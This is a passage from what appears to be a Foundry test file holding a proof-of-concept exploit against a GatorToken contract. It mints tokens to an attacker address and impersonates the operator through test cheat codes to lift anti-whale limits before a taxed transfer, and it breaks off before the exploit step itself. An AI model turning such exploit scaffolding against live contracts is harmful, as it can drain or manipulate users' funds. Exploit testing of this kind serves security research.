        GatorToken(TARGET).mint(attacker, 1000 ether);
        vm.stopPrank();

        // Also need to set up the router/pair for swapAndLiquify to work if needed
        // But for simple transfer test, we don't need it
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Record initial total supply
        uint256 initialSupply = GatorToken(TARGET).totalSupply();

        // Get some tokens to attacker if not already done in setup
        // (Assuming setup already gave us tokens)

        // Check attacker balance
        uint256 attackerBalance = GatorToken(TARGET).balanceOf(attacker);
        console.log("Attacker balance before:", attackerBalance);

        // Transfer to another address (not BURN_ADDRESS) to trigger tax
        // Use a small amount to avoid anti-whale restrictions
        address recipient = address(0x123);

        // First, exclude attacker from anti-whale if needed
        // Need to impersonate operator
        address operator = GatorToken(TARGET).operator();
        vm.prank(operator);
        GatorToken(TARGET).setExcludedFromAntiWhale(attacker, true);
        vm.prank(operator);
        GatorToken(TARGET).setExcludedFromAntiWhale(recipient, true);

